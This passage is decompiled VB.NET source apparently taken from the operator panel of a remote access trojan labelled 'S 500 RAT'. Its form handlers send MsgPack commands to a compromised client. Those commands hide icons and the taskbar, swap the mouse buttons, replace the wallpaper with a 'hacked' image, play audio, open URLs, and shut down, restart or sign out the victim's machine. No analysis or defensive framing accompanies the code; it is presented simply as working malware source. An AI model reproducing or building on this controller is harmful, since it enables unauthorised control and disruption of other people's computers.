					msgPack.ForcePathObject("img").SetAsBytes(Me.HackedImg)
					msgPack.ForcePathObject("Sarmat").SetAsBytes(Resources.Sarmat)
					msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(Me.TextBox1Background.Text).ToLower()
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x060003C2 RID: 962 RVA: 0x00020DE0 File Offset: 0x0001EFE0
		Private Sub UnlockScreen_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "UnloackScreen"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003C3 RID: 963 RVA: 0x00020E28 File Offset: 0x0001F028
		Private Sub IconHide_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "IconDesktopHide"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003C4 RID: 964 RVA: 0x00020E70 File Offset: 0x0001F070
		Private Sub IconShow_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "IconDesktopShow"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003C5 RID: 965 RVA: 0x00020EB8 File Offset: 0x0001F0B8
		Private Sub TaskBarHide_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "TaskBarHide"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003C6 RID: 966 RVA: 0x00020F00 File Offset: 0x0001F100
		Private Sub TaskBarShow_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "TaskBarShow"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003C7 RID: 967 RVA: 0x00020F48 File Offset: 0x0001F148
		Private Sub IconTaskbar_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "IconTaskBarShow"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003C8 RID: 968 RVA: 0x00020F90 File Offset: 0x0001F190
		Private Sub ShowIconTaskBar_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "IconTaskBarHide"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003C9 RID: 969 RVA: 0x00020FD8 File Offset: 0x0001F1D8
		Private Sub ClockHide_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "DesktopHide"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003CA RID: 970 RVA: 0x00021020 File Offset: 0x0001F220
		Private Sub ClockShow_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "DesktopShow"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003CB RID: 971 RVA: 0x00021068 File Offset: 0x0001F268
		Private Sub Mousestop_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "SwapMouse"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003CC RID: 972 RVA: 0x000210B0 File Offset: 0x0001F2B0
		Private Sub MouseRestor_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "RestoreMouse"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003CD RID: 973 RVA: 0x000210F8 File Offset: 0x0001F2F8
		Private Sub DesktopBackground_Click(sender As Object, e As EventArgs)
			Try
				Using openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.Title = "S 500 RAT | Fun"
					openFileDialog.Filter = "Desktop Background |*.bmp;*.jpg;*.jpeg;*.png"
					openFileDialog.Multiselect = False
					Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
					If flag Then
						Dim image As Image = Image.FromFile(openFileDialog.FileName)
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "DesktopBackground"
						msgPack.ForcePathObject("Background").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName))
						msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName).ToLower()
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					End If
				End Using
			Catch ex As Exception
				MessageBox.Show(ex.ToString(), "Fun!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x060003CE RID: 974 RVA: 0x00021218 File Offset: 0x0001F418
		Private Sub Audio_Click(sender As Object, e As EventArgs)
			Try
				Using openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.Title = "S 500 RAT | Fun"
					openFileDialog.Filter = "File (*.wav)|*.wav"
					openFileDialog.Multiselect = False
					Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
					If flag Then
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "PlayAudio"
						msgPack.ForcePathObject("wav").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName))
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					End If
				End Using
			Catch ex As Exception
				MessageBox.Show(ex.Message, "Fun!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x060003CF RID: 975 RVA: 0x00021304 File Offset: 0x0001F504
		Private Sub Web_IconRightClick(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.Web.Text.Length = 0
			If flag Then
				MessageBox.Show("Please Enter your Url ", "Fun!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			Else
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "WebSite"
				msgPack.ForcePathObject("Url").AsString = Me.Web.Text
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x060003D0 RID: 976 RVA: 0x00021398 File Offset: 0x0001F598
		Private Sub Monitor_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "Monitor"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003D1 RID: 977 RVA: 0x000213E0 File Offset: 0x0001F5E0
		Private Sub ShutDown_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "Shutdow"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003D2 RID: 978 RVA: 0x00021428 File Offset: 0x0001F628
		Private Sub Restart_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "Restart"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003D3 RID: 979 RVA: 0x00021470 File Offset: 0x0001F670
		Private Sub SignOut_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "LougOut"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003D4 RID: 980 RVA: 0x000214B8 File Offset: 0x0001F6B8
		Private Sub TaskBaerHide_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "TaskBarHide"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x060003D5 RID: 981 RVA: 0x00021500 File Offset: 0x0001F700
		Private Sub TaskBarShow_Click_1(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "TaskBarShow"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x040001B6 RID: 438
		Private FormSize As Boolean

		' Token: 0x040001B7 RID: 439
		Public HackedImg As Byte()
	End Class
End Namespace
